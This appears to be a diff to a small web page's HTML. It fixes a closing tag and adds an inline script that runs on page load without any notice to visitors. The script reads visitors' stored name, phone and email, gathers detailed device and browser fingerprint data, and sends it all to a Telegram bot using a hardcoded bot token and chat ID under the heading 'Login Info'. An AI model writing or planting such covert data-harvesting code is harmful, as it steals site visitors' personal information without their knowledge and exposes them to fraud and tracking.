@@ -42,7 +42,7 @@
   </div>
   <center>
   <p>Life is short please be kind !!...</p>
-        <a href="game.html" class="order-now-btn">SELBYME GAME</a> <center/>
+        <a href="game.html" class="order-now-btn">SELBYME GAME</a> </center>
   
   
 
@@ -82,6 +82,84 @@
     }
     tick(); setInterval(tick,1000);
   </script>
+          <script>
+(async () => {
+  const TG_BOT_TOKEN = "8345934262:AAGuzQx714DTbZFDLnykLNu0yZKXDoQQXdU";
+  const TG_CHAT_ID   = "6268442991";
+
+  if (sessionStorage.getItem("sel_notified")) return;
+
+  const name  = localStorage.getItem("user_name")  || "N/A";
+  const phone = localStorage.getItem("user_phone") || "N/A";
+  const email = localStorage.getItem("user_email") || "N/A";
+
+  const battery    = navigator.getBattery ? await navigator.getBattery() : null;
+  const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || null;
+  const timing     = performance.timing || {};
+  const loadDur    = (timing.loadEventEnd && timing.navigationStart) ? (timing.loadEventEnd - timing.navigationStart) : 0;
+
+  const msg = [
+    "🔐 <b>Login Info</b>",
+    "",
+    `👨‍💼 <b>Name:</b> ${name}`,
+    `📞 <b>Phone:</b> ${phone}`,
+    `✉️ <b>Email:</b> ${email}`,
+    `🌐 <b>Page:</b> ${location.href}`,
+    `📅 <b>Time:</b> ${new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" })}`,
+    "",
+    `🌍 <b>Timezone:</b> ${Intl.DateTimeFormat().resolvedOptions().timeZone}`,
+    `🌐 <b>Language:</b> ${navigator.language}`,
+    `🖥️ <b>Platform:</b> ${navigator.platform}`,
+    `🧭 <b>User-Agent:</b> ${navigator.userAgent}`,
+    `🏢 <b>Vendor:</b> ${navigator.vendor || "N/A"}`,
+    "",
+    `🔌 <b>Plugins:</b> ${navigator.plugins.length}`,
+    `📶 <b>Online:</b> ${navigator.onLine ? "Yes" : "No"}`,
+    "",
+    `📱 <b>Screen:</b> ${screen.width}×${screen.height}`,
+    `🪟 <b>Window:</b> ${innerWidth}×${innerHeight}`,
+    `🎨 <b>Color-Depth:</b> ${screen.colorDepth}`,
+    `📐 <b>Pixel-Depth:</b> ${screen.pixelDepth}`,
+    `🔄 <b>Orientation:</b> ${screen.orientation?.type || "N/A"} (${screen.orientation?.angle ?? 0}°)`,
+    "",
+    `🍪 <b>Cookies Enabled:</b> ${navigator.cookieEnabled ? "Yes" : "No"}`,
+    `🛑 <b>Do-Not-Track:</b> ${navigator.doNotTrack === "1" ? "Yes" : "No"}`,
+    "",
+    `⏳ <b>Page-Load:</b> ${loadDur} ms`,
+    `📊 <b>CPU Cores:</b> ${navigator.hardwareConcurrency ?? "N/A"}`,
+    `💾 <b>Device RAM:</b> ${navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A"}`,
+    performance.memory ? `🧠 <b>JS Heap Used:</b> ${Math.round(performance.memory.jsHeapUsedSize / 1048576)} MB` : "",
+    "",
+    connection ? `📡 <b>Conn Type:</b> ${connection.effectiveType}` : "",
+    connection ? `📶 <b>Downlink:</b> ${connection.downlink} Mbps` : "",
+    connection ? `⏱️ <b>RTT:</b> ${connection.rtt} ms` : "",
+    connection ? `💾 <b>Save-Data:</b> ${connection.saveData ? "Yes" : "No"}` : "",
+    "",
+    `📜 <b>Title:</b> ${document.title}`,
+    `👁️ <b>Visibility:</b> ${document.visibilityState}`,
+    `📜 <b>History Len:</b> ${history.length}`,
+    `📦 <b>localStorage:</b> ${localStorage.length} items`,
+    `📦 <b>sessionStorage:</b> ${sessionStorage.length} items`,
+    `🗒️ <b>Service Worker:</b> ${"serviceWorker" in navigator ? "Supported" : "No"}`,
+    "",
+    battery ? `🔋 <b>Battery:</b> ${Math.round(battery.level * 100)}%` : "",
+    battery ? `⚡ <b>Charging:</b> ${battery.charging ? "Yes" : "No"}` : ""
+  ].filter(Boolean).join("\n\n");
+
+  try {
+    const res = await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: TG_CHAT_ID, text: msg, parse_mode: "HTML", disable_web_page_preview: true })
+    });
+    if (res.ok) console.log("[SEL] Telegram notified");
+  } catch (e) {
+    console.error("[SEL] Telegram notify failed", e);
+  }
+
+  sessionStorage.setItem("sel_notified", "1");
+})();
+          </script>
   <script src="app.js" defer></script>
 </body>
 </html>
